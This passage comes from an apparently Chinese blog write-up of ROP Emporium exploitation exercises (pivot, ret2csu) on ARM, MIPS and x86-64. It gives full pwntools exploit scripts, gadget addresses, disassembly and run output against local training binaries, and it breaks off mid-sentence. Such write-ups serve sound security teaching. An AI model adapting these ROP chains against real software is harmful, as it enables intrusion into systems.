class=\"string\">b&quot;A&quot;</span>*<span class=\"number\">32</span></span><br><span class=\"line\">payload_2 += p64(leakaddr-<span class=\"number\">8</span>) + p64(leave_ret)</span><br><span class=\"line\"></span><br><span class=\"line\">io.send(payload_2)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure></li>\r\n</ol>\r\n<h3 id=\"armv5-1\">armv5</h3>\r\n<p>实话来说，这道题做的时间最长，断断续续做了近1个月，主要是由于自己对ARM指令的了解不够深入导致的，不过庆幸的是最终也做了出来，这里先给出exp，详细解释有空再补。</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># for armv5</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;arm&#x27;</span></span><br><span class=\"line\">context.endian = <span class=\"string\">&#x27;little&#x27;</span></span><br><span class=\"line\">context.bits = <span class=\"number\">32</span></span><br><span class=\"line\"></span><br><span class=\"line\">io = process([<span class=\"string\">&#x27;qemu-arm&#x27;</span>,  <span class=\"string\">&#x27;-L&#x27;</span>, <span class=\"string\">&#x27;/usr/arm-linux-gnueabi/&#x27;</span>, <span class=\"string\">&#x27;./pivot_armv5&#x27;</span>])</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./pivot_armv5&#x27;</span>)</span><br><span class=\"line\">libp = ELF(<span class=\"string\">&#x27;./libpivot_armv5.so&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">foothold_plt     = elf.plt[<span class=\"string\">&#x27;foothold_function&#x27;</span>]</span><br><span class=\"line\">foothold_got_plt = elf.got[<span class=\"string\">&#x27;foothold_function&#x27;</span>]</span><br><span class=\"line\">foothold_sym = libp.symbols[<span class=\"string\">&#x27;foothold_function&#x27;</span>]</span><br><span class=\"line\">ret2win_sym  = libp.symbols[<span class=\"string\">&#x27;ret2win&#x27;</span>]</span><br><span class=\"line\">offset = <span class=\"built_in\">int</span>(ret2win_sym - foothold_sym)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(foothold_plt), <span class=\"built_in\">hex</span>(foothold_got_plt))</span><br><span class=\"line\"></span><br><span class=\"line\">puts = elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;0x&quot;</span>)</span><br><span class=\"line\">leakaddr  = <span class=\"built_in\">int</span>(io.recv(<span class=\"number\">8</span>),<span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">sub_sp_r11_4_pop_r11_pc = <span class=\"number\">0x000108B8</span></span><br><span class=\"line\">ldr_r0_r0 = <span class=\"number\">0x00010900</span></span><br><span class=\"line\">pop_r4_r11_pc = <span class=\"number\">0x00010908</span></span><br><span class=\"line\">pop_r11_pc = <span class=\"number\">0x000108BC</span></span><br><span class=\"line\">ldr_r3_r7_blx_r3 = <span class=\"number\">0x00010924</span></span><br><span class=\"line\">mov_lr_r4_movs_r3_r7_bx_r3 = <span class=\"number\">0x0001091C</span></span><br><span class=\"line\">add_r0_r1 = <span class=\"number\">0x0001090C</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload_1 = p32(leakaddr)</span><br><span class=\"line\">payload_1 += p32(pop_r4_r11_pc)</span><br><span class=\"line\"></span><br><span class=\"line\">payload_1 += p32(pop_r11_pc) <span class=\"comment\"># r4-&gt;lr-&gt;bx lr</span></span><br><span class=\"line\">payload_1 += p32(leakaddr + <span class=\"number\">18</span> * <span class=\"number\">4</span>) <span class=\"comment\"># r3 r7</span></span><br><span class=\"line\">payload_1 += p32(ldr_r3_r7_blx_r3)</span><br><span class=\"line\"></span><br><span class=\"line\">payload_1 += p32(leakaddr + <span class=\"number\">0x10</span> + <span class=\"number\">13</span>*<span class=\"number\">4</span>) <span class=\"comment\"># foothold_got_plt </span></span><br><span class=\"line\">payload_1 += p32(ldr_r0_r0)</span><br><span class=\"line\"></span><br><span class=\"line\">payload_1 += p32(pop_r4_r11_pc) <span class=\"comment\"># r4 -&gt; lr -&gt; bx lr</span></span><br><span class=\"line\">payload_1 += p32(leakaddr + <span class=\"number\">20</span> * <span class=\"number\">4</span>) <span class=\"comment\"># r3 r7</span></span><br><span class=\"line\">payload_1 += p32(ldr_r3_r7_blx_r3)</span><br><span class=\"line\"></span><br><span class=\"line\">payload_1 += p32(leakaddr + <span class=\"number\">0x10</span> + <span class=\"number\">12</span> * <span class=\"number\">4</span>) <span class=\"comment\"># r11 offset</span></span><br><span class=\"line\">payload_1 += p32(add_r0_r1)</span><br><span class=\"line\"></span><br><span class=\"line\">payload_1 += p32(offset)</span><br><span class=\"line\">payload_1 += p32(foothold_got_plt)</span><br><span class=\"line\">payload_1 += <span class=\"string\">b&quot;BBBB&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload_1 += p32(foothold_plt) <span class=\"comment\"># r7-&gt;r3-&gt;bx r3</span></span><br><span class=\"line\">payload_1 += p32(mov_lr_r4_movs_r3_r7_bx_r3 + <span class=\"number\">1</span>) <span class=\"comment\"># r3-&gt;blx r3</span></span><br><span class=\"line\">payload_1 += p32(pop_r11_pc) <span class=\"comment\"># r7 -&gt; r3 -&gt; bx r3</span></span><br><span class=\"line\">payload_1 += p32(mov_lr_r4_movs_r3_r7_bx_r3 + <span class=\"number\">1</span>) <span class=\"comment\"># r3-&gt; blx r3</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;&gt; &quot;</span>)</span><br><span class=\"line\">io.send(payload_1)</span><br><span class=\"line\"></span><br><span class=\"line\">payload_2  = <span class=\"string\">b&quot;A&quot;</span>* <span class=\"number\">0x20</span></span><br><span class=\"line\">payload_2 += p32(leakaddr+<span class=\"number\">4</span>) + p32(sub_sp_r11_4_pop_r11_pc)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;&gt; &quot;</span>)</span><br><span class=\"line\">io.send(payload_2)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;arm&#x27;</span></span><br><span class=\"line\">context.endian = <span class=\"string\">&#x27;little&#x27;</span></span><br><span class=\"line\">context.bits = <span class=\"number\">32</span></span><br><span class=\"line\"></span><br><span class=\"line\">io = process([<span class=\"string\">&#x27;qemu-arm&#x27;</span>,  <span class=\"string\">&#x27;-L&#x27;</span>, <span class=\"string\">&#x27;/usr/arm-linux-gnueabihf/&#x27;</span>, <span class=\"string\">&#x27;./pivot_armv5-hf&#x27;</span>])</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./pivot_armv5-hf&#x27;</span>)</span><br><span class=\"line\">libp = ELF(<span class=\"string\">&#x27;./libpivot_armv5-hf.so&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">foothold_plt     = elf.plt[<span class=\"string\">&#x27;foothold_function&#x27;</span>]</span><br><span class=\"line\">foothold_got_plt = elf.got[<span class=\"string\">&#x27;foothold_function&#x27;</span>]</span><br><span class=\"line\">foothold_sym = libp.symbols[<span class=\"string\">&#x27;foothold_function&#x27;</span>]</span><br><span class=\"line\">ret2win_sym  = libp.symbols[<span class=\"string\">&#x27;ret2win&#x27;</span>]</span><br><span class=\"line\">offset = <span class=\"built_in\">int</span>(ret2win_sym - foothold_sym)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(foothold_plt), <span class=\"built_in\">hex</span>(foothold_got_plt))</span><br><span class=\"line\"></span><br><span class=\"line\">puts = elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;0x&quot;</span>)</span><br><span class=\"line\">leakaddr  = <span class=\"built_in\">int</span>(io.recv(<span class=\"number\">8</span>),<span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">pop_lr_pc = <span class=\"number\">0x0001099c</span> <span class=\"comment\"># pop &#123;r1, r2, r4, r5, r6, r7, r8, ip, lr, pc&#125;</span></span><br><span class=\"line\">sub_sp_r11_4_pop_r11_pc = <span class=\"number\">0x000108F0</span></span><br><span class=\"line\">ldr_r0_r0 = <span class=\"number\">0x0001093C</span></span><br><span class=\"line\">pop_r4_r11_pc = <span class=\"number\">0x00010944</span></span><br><span class=\"line\">ldr_r3_r7_blx_r3 = <span class=\"number\">0x00010960</span></span><br><span class=\"line\">mov_lr_r4_movs_r3_r7_bx_r3 = <span class=\"number\">0x00010958</span></span><br><span class=\"line\">add_r0_r1 = <span class=\"number\">0x00010948</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload_1 = p32(leakaddr)</span><br><span class=\"line\">payload_1 += p32(pop_lr_pc)</span><br><span class=\"line\">payload_1 += <span class=\"string\">b&quot;AAAA&quot;</span> * <span class=\"number\">8</span></span><br><span class=\"line\">payload_1 += p32(pop_r4_r11_pc)             </span><br><span class=\"line\">payload_1 += p32(foothold_plt)           </span><br><span class=\"line\"></span><br><span class=\"line\">payload_1 += <span class=\"string\">b&quot;BBBB&quot;</span></span><br><span class=\"line\">payload_1 += p32(leakaddr + <span class=\"number\">0x10</span> + <span class=\"number\">29</span>*<span class=\"number\">4</span>)</span><br><span class=\"line\">payload_1 += p32(ldr_r0_r0)</span><br><span class=\"line\"></span><br><span class=\"line\">payload_1 += <span class=\"string\">b&quot;CCCC&quot;</span></span><br><span class=\"line\">payload_1 += p32(leakaddr + <span class=\"number\">0x10</span> + <span class=\"number\">28</span> * <span class=\"number\">4</span>) <span class=\"comment\"># r11</span></span><br><span class=\"line\">payload_1 += p32(pop_lr_pc)</span><br><span class=\"line\"></span><br><span class=\"line\">payload_1 += <span class=\"string\">b&quot;DDDD&quot;</span> * <span class=\"number\">8</span></span><br><span class=\"line\">payload_1 += p32(pop_r4_r11_pc) <span class=\"comment\"># lr</span></span><br><span class=\"line\">payload_1 += p32(add_r0_r1)</span><br><span class=\"line\">payload_1 += p32(offset)</span><br><span class=\"line\">payload_1 += p32(foothold_got_plt)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;&gt; &quot;</span>)</span><br><span class=\"line\">io.send(payload_1)</span><br><span class=\"line\"></span><br><span class=\"line\">payload_2  = <span class=\"string\">b&quot;A&quot;</span>* <span class=\"number\">0x20</span></span><br><span class=\"line\">payload_2 += p32(leakaddr+<span class=\"number\">4</span>) + p32(sub_sp_r11_4_pop_r11_pc)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;&gt; &quot;</span>)</span><br><span class=\"line\">io.send(payload_2)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\r\n<h3 id=\"mipsel-1\">mipsel</h3>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;mips&#x27;</span></span><br><span class=\"line\">context.endian = <span class=\"string\">&#x27;little&#x27;</span></span><br><span class=\"line\">context.bits = <span class=\"number\">32</span></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">io = process([<span class=\"string\">&#x27;qemu-mipsel&#x27;</span>, <span class=\"string\">&#x27;-L&#x27;</span>, <span class=\"string\">&#x27;/usr/mipsel-linux-gnu/&#x27;</span>, <span class=\"string\">&#x27;./pivot_mipsel&#x27;</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./pivot_mipsel&#x27;</span>)</span><br><span class=\"line\">libp = ELF(<span class=\"string\">&#x27;./libpivot_mipsel.so&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">foothold_plt     = <span class=\"number\">0x00400E60</span></span><br><span class=\"line\">foothold_got_plt = elf.got[<span class=\"string\">&#x27;foothold_function&#x27;</span>] <span class=\"comment\">#0x00412060</span></span><br><span class=\"line\">foothold_sym = libp.symbols[<span class=\"string\">&#x27;foothold_function&#x27;</span>]</span><br><span class=\"line\">ret2win_sym  = libp.symbols[<span class=\"string\">&#x27;ret2win&#x27;</span>]</span><br><span class=\"line\">offset = <span class=\"built_in\">int</span>(ret2win_sym - foothold_sym)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(foothold_plt), <span class=\"built_in\">hex</span>(foothold_got_plt))</span><br><span class=\"line\"></span><br><span class=\"line\">mov_sp_fp = <span class=\"number\">0x00400CD0</span></span><br><span class=\"line\">lw_t9_t0_jalr_t9 = <span class=\"number\">0x00400CA0</span></span><br><span class=\"line\">add_t0_t1 = <span class=\"number\">0x00400CC4</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;0x&quot;</span>)</span><br><span class=\"line\">leakaddr  = <span class=\"built_in\">int</span>(io.recv(<span class=\"number\">8</span>),<span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload_1 = p32(leakaddr)</span><br><span class=\"line\">payload_1 += p32(lw_t9_t0_jalr_t9)</span><br><span class=\"line\">payload_1 += <span class=\"string\">b&quot;AAAA&quot;</span> * <span class=\"number\">2</span></span><br><span class=\"line\">payload_1 += p32(foothold_plt)</span><br><span class=\"line\"></span><br><span class=\"line\">payload_1 += <span class=\"string\">b&quot;BBBB&quot;</span></span><br><span class=\"line\">payload_1 += p32(foothold_got_plt)</span><br><span class=\"line\">payload_1 += p32(lw_t9_t0_jalr_t9)</span><br><span class=\"line\"></span><br><span class=\"line\">payload_1 += <span class=\"string\">b&quot;CCCC&quot;</span></span><br><span class=\"line\">payload_1 += p32(offset)</span><br><span class=\"line\">payload_1 += p32(add_t0_t1)</span><br><span class=\"line\"></span><br><span class=\"line\">payload_2 = <span class=\"string\">b&quot;A&quot;</span> * <span class=\"number\">0x20</span></span><br><span class=\"line\">payload_2 += p32(leakaddr - <span class=\"number\">4</span>)</span><br><span class=\"line\">payload_2 += p32(mov_sp_fp)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;&gt; &quot;</span>)</span><br><span class=\"line\">io.send(payload_1)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;&gt; &quot;</span>)</span><br><span class=\"line\">io.send(payload_2)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\r\n<h2 id=\"ret2csu\">ret2csu</h2>\r\n<h3 id=\"x64\">x64</h3>\r\n<p>这道题的考点在于需要利用<code>libc_csu_init</code>的指令构造gadget，因此名字为<code>ret2csu</code>。</p>\r\n<h4 id=\"分析-3\">分析</h4>\r\n<p>打开压缩包，发现存在5个文件如下：</p>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ tree</span><br><span class=\"line\">.</span><br><span class=\"line\">├── encrypted_flag.dat</span><br><span class=\"line\">├── exp.py</span><br><span class=\"line\">├── key.dat</span><br><span class=\"line\">├── libret2csu.so</span><br><span class=\"line\">└── ret2csu</span><br><span class=\"line\"></span><br><span class=\"line\">0 directories, 5 files</span><br></pre></td></tr></table></figure>\r\n<p>首先将ret2csu拖入IDA，发现main函数中直接调用了pwnme外部函数，且userfulFunction函数中直接调用ret2win外部函数。因此直接查看<code>libret2csu.so</code>中的内容，发现pwnme函数和ret2win函数内容如下：</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">pwnme</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> s; <span class=\"comment\">// [rsp+0h] [rbp-20h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0LL</span>, <span class=\"number\">2</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;ret2csu by ROP Emporium&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;x86_64\\n&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(&amp;s, <span class=\"number\">0</span>, <span class=\"number\">0x20</span>uLL);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.\\n&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;&gt; &quot;</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;s, <span class=\"number\">0x200</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Thank you!&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> __fastcall __noreturn <span class=\"title function_\">ret2win</span><span class=\"params\">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  FILE *stream; <span class=\"comment\">// [rsp+20h] [rbp-10h]</span></span><br><span class=\"line\">  FILE *streama; <span class=\"comment\">// [rsp+20h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"type\">signed</span> <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+2Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( a1 == <span class=\"number\">0xDEADBEEFDEADBEEF</span>LL &amp;&amp; a2 == <span class=\"number\">0xCAFEBABECAFEBABE</span>LL &amp;&amp; a3 == <span class=\"number\">0xD00DF00DD00DF00D</span>LL )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    stream = fopen(<span class=\"string\">&quot;encrypted_flag.dat&quot;</span>, <span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !stream )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Failed to open encrypted_flag.dat&quot;</span>);</span><br><span class=\"line\">      <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    g_buf = (<span class=\"type\">char</span> *)<span class=\"built_in\">malloc</span>(<span class=\"number\">0x21</span>uLL);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !g_buf )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Could not allocate memory&quot;</span>);</span><br><span class=\"line\">      <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    g_buf = fgets(g_buf, <span class=\"number\">33</span>, stream);</span><br><span class=\"line\">    fclose(stream);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( a1 != <span class=\"number\">0xDEADBEEFDEADBEEF</span>LL )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Incorrect parameters&quot;</span>);</span><br><span class=\"line\">      <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    streama = fopen(<span class=\"string\">&quot;key.dat&quot;</span>, <span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !streama )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Failed to open key.dat&quot;</span>);</span><br><span class=\"line\">      <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">31</span>; ++i )</span><br><span class=\"line\">      g_buf[i] ^= fgetc(streama);</span><br><span class=\"line\">    *(_QWORD *)(g_buf + <span class=\"number\">4</span>) ^= <span class=\"number\">0xDEADBEEFDEADBEEF</span>LL;</span><br><span class=\"line\">    *(_QWORD *)(g_buf + <span class=\"number\">12</span>) ^= <span class=\"number\">0xCAFEBABECAFEBABE</span>LL;</span><br><span class=\"line\">    *(_QWORD *)(g_buf + <span class=\"number\">20</span>) ^= <span class=\"number\">0xD00DF00DD00DF00D</span>LL;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(g_buf);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Incorrect parameters&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>可以看出pwnme函数中的<code>read(0, &amp;s, 0x200uLL);</code>存在溢出漏洞，且pwnme函数提示<code>Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.</code>，因此查看该网页内容，发现提示需要构造pop链到<code>__libc_csu_init()</code>中的指令。</p>\r\n<p>若想要ret2win函数成功执行，则其三个参数需要分别为<code>0xDEADBEEFDEADBEEF, 0xCAFEBABECAFEBABE, 0xD00DF00DD00DF00D</code>，然而userfulFunction函数中调用ret2win时参数分别为<code>1, 2, 3</code>，因此无法直接将pwnme函数的返回地址覆盖为userfulFunction函数地址，还是需要利用其他gadget，结合pwnme函数中的提示，查看<code>libc_csu_init</code>处指令：</p>\r\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.text:0000000000400680 loc_400680:                             ; CODE XREF: __libc_csu_init+54↓j</span><br><span class=\"line\">.text:0000000000400680                 mov     rdx, r15</span><br><span class=\"line\">.text:0000000000400683                 mov     rsi, r14</span><br><span class=\"line\">.text:0000000000400686                 mov     edi, r13d</span><br><span class=\"line\">.text:0000000000400689                 call    qword ptr [r12+rbx*8]</span><br><span class=\"line\">.text:000000000040068D                 add     rbx, 1</span><br><span class=\"line\">.text:0000000000400691                 cmp     rbp, rbx</span><br><span class=\"line\">.text:0000000000400694                 jnz     short loc_400680</span><br><span class=\"line\">.text:0000000000400696</span><br><span class=\"line\">.text:0000000000400696 loc_400696:                             ; CODE XREF: __libc_csu_init+34↑j</span><br><span class=\"line\">.text:0000000000400696                 add     rsp, 8</span><br><span class=\"line\">.text:000000000040069A                 pop     rbx</span><br><span class=\"line\">.text:000000000040069B                 pop     rbp</span><br><span class=\"line\">.text:000000000040069C                 pop     r12</span><br><span class=\"line\">.text:000000000040069E                 pop     r13</span><br><span class=\"line\">.text:00000000004006A0                 pop     r14</span><br><span class=\"line\">.text:00000000004006A2                 pop     r15</span><br><span class=\"line\">.text:00000000004006A4                 retn</span><br></pre></td></tr></table></figure>\r\n<p>发现<code>0x40069A</code>处开始的pop指令将栈上数据分别弹出给相关寄存器，且<code>0x400680</code>处开始的指令分别将<em>r15，r14，r13d</em>寄存器复制给<em>rdx，rsi，edi</em> 寄存器，然后call指令将r12+rbx*8作为地址指向的数据进行调用，刚开始存在疑点，在于如何构造r12和rbx，使得其作为地址指向ret2win函数，后面参考了<a href=\"https://blog.csdn.net/AcSuccess/article/details/104448463\">这篇文章</a>，才知道可以通过构造特定值，忽略此处的call指令，使得其继续执行接下来的指令，通过再次执行retn指令跳转到ret2win函数。</p>\r\n<blockquote>\r\n<p>call qword ptr [r12+rbx*8]将会间接跳转，需要其正常返回，而且不破坏原有rdx，rsi，rdi寄存器的值。</p>\r\n<p>发现0x4006B0处的<strong>rep retn</strong>指令满足该规则，且0x600DF8处的值恰好为<code>004006b0</code>，因此r12+rbx*8的值应当为0x600DF8，可以使得<strong>call qword ptr [r12+rbx*8]</strong> 直接返回，不影响前面的指令结果。</p>\r\n</blockquote>\r\n<p>接下来依次运行add指令、cmp指令和jnz指令，为使得能够正常运行后面的pop指令，可以在第一次pop时将rbx赋值为0，rbp赋值为1。</p>\r\n<p>值得注意的是，<strong>mov edi, r13d</strong> 指令仅修改了edi寄存器，对rdi寄存器的高32位未进行修改，因此在第2次retn时，不能直接跳转到ret2win函数，需要先跳转到修改rdi的gadget位置，再返回时跳转到ret2win函数。</p>\r\n<p>查看是否存在修改rdi寄存器的gadget：</p>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ ROPgadget --binary ret2csu --only <span class=\"string\">&quot;pop|ret&quot;</span> | grep rdi</span><br><span class=\"line\">0x00000000004006a3 : pop rdi ; ret</span><br></pre></td></tr></table></figure>\r\n<h4 id=\"编写exp-3\">编写exp</h4>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./ret2csu&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">pop_rbx_rbp_r12__r15 = <span class=\"number\">0x40069A</span></span><br><span class=\"line\">mov_call = <span class=\"number\">0x400680</span></span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x00000000004006a3</span></span><br><span class=\"line\">ret2win = <span class=\"number\">0x400510</span></span><br><span class=\"line\">init_array_end = <span class=\"number\">0x0000000000600df8</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;A&quot;</span> * (<span class=\"number\">0x20</span>+<span class=\"number\">8</span>)</span><br><span class=\"line\">payload += p64(pop_rbx_rbp_r12__r15)</span><br><span class=\"line\">payload += p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload += p64(<span class=\"number\">1</span>)</span><br><span class=\"line\">payload += p64(init_array_end)</span><br><span class=\"line\">payload += p64(<span class=\"number\">0xDEADBEEFDEADBEEF</span>)</span><br><span class=\"line\">payload += p64(<span class=\"number\">0xCAFEBABECAFEBABE</span>)</span><br><span class=\"line\">payload += p64(<span class=\"number\">0xD00DF00DD00DF00D</span>)</span><br><span class=\"line\">payload += p64(mov_call)</span><br><span class=\"line\">payload += <span class=\"string\">b&quot;BBBBBBBB&quot;</span> * <span class=\"number\">7</span></span><br><span class=\"line\">payload += p64(pop_rdi)</span><br><span class=\"line\">payload += p64(<span class=\"number\">0xDEADBEEFDEADBEEF</span>)</span><br><span class=\"line\">payload += p64(ret2win)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\r\n<h4 id=\"运行结果-3\">运行结果</h4>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ python exp.py </span><br><span class=\"line\">[+] Starting <span class=\"built_in\">local</span> process <span class=\"string\">&#x27;./ret2csu&#x27;</span>: pid 5986</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">[*] Process <span class=\"string\">&#x27;./ret2csu&#x27;</span> stopped with <span class=\"built_in\">exit</span> code 0 (pid 5986)</span><br><span class=\"line\">ret2csu by ROP Emporium</span><br><span class=\"line\">x86_64</span><br><span class=\"line\"></span><br><span class=\"line\">Check out https://ropemporium.com/challenge/ret2csu.html <span class=\"keyword\">for</span> information on how to solve this challenge.</span><br><span class=\"line\"></span><br><span class=\"line\">&gt; Thank you!</span><br><span class=\"line\">ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br><span class=\"line\">[*] Got EOF <span class=\"keyword\">while</span> reading <span class=\"keyword\">in</span> interactive</span><br></pre></td></tr></table></figure>\r\n<h3 id=\"armv5-2\">armv5</h3>\r\n<h4 id=\"分析-4\">分析</h4>\r\n<p>利用原理和x64类似，均需要利用 <code>libc_csu_init</code>处的指令构造gadget，首先查看该处指令：</p>\r\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.text:00010624 loc_10624                               ; CODE XREF: __libc_csu_init+50↓j</span><br><span class=\"line\">.text:00010624                 ADD     R4, R4, #1</span><br><span class=\"line\">.text:00010628                 LDR     R3, [R5],#4</span><br><span class=\"line\">.text:0001062C                 MOV     R2, R9</span><br><span class=\"line\">.text:00010630                 MOV     R1, R8</span><br><span class=\"line\">.text:00010634                 MOV     R0, R7</span><br><span class=\"line\">.text:00010638                 BLX     R3</span><br><span class=\"line\">.text:0001063C                 CMP     R6, R4</span><br><span class=\"line\">.text:00010640                 BNE     loc_10624</span><br><span class=\"line\">.text:00010644                 LDMFD   SP!, &#123;R4-R10,PC&#125;</span><br></pre></td></tr></table></figure>\r\n<p>可以看到<strong>LDMFD SP!, {R4-R10,PC}</strong>指令将栈上的数据弹出给寄存器R4到R10和PC，而从<code>0001062C</code>开始的三条<strong>mov</strong>指令分别将<em>R9，R8，R7</em>三个寄存器复制给<em>R2，R1，R0</em>，刚好为ret2win函数所需的三个参数寄存器，因此<em>R9，R8，R7</em>三个寄存器值应当复制为ret2win的三个参数，接下来的<strong>BLX 